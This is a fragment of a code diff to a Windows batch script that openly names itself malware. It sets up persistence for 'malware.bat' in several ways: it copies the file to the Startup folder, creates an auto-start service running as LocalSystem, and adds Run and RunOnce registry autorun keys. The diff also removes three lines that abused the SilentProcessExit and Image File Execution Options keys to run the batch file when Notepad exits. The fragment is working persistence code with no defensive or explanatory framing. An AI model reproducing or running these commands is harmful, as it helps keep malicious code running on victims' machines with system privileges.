@@ -46,9 +46,6 @@ copy /Y "%appdata%\Microsoft\Windows\Start Menu\Programs\StartUp\malware.bat" "C
 sc create persistence binpath="cmd.exe /k C:\Windows\Temp\malware.bat" start="auto" obj="LocalSystem" /f
 
 :: Create registry keys for autorun
-reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 0x200 /f
-reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 0x1 /f
-reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG_SZ /d C:\Windows\Temp\malware.bat /f
 reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Malware /t REG_SZ /d C:\Windows\Temp\malware.bat /f
 reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Malware /t REG_SZ /d C:\Windows\Temp\malware.bat /f
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Malware /t REG_SZ /d C:\Windows\Temp\malware.bat /f
